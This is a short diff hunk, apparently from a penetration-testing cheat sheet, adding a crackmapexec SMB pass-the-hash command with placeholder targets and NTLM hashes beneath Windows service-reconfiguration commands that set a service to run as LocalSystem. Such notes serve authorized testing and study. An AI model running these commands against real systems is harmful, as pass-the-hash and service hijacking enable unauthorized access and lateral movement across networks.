@@ -26,5 +26,9 @@ sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
 sc config <SERVICE_NAME> start= auto
 net start <SERVICE_NAME>
 
+*CME
+crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
+
+
 
 
